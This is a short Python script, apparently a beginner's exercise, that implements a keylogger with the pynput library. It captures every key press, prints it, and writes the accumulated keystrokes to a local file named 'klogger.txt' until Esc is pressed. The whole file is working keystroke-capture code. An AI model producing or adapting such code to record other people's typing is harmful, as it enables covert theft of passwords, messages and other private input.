import pynput.keyboard as Keybaord
from pynput.keyboard import Listener

keys = []
def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print(f'key {key.char} pressed!')
    except AttributeError:
        print(f'Special {key} pressed!')

def write_file(keys):
    with open('klogger.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')

def on_release(key):
    print(f'Key {key} released')
    if key == Keybaord.Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()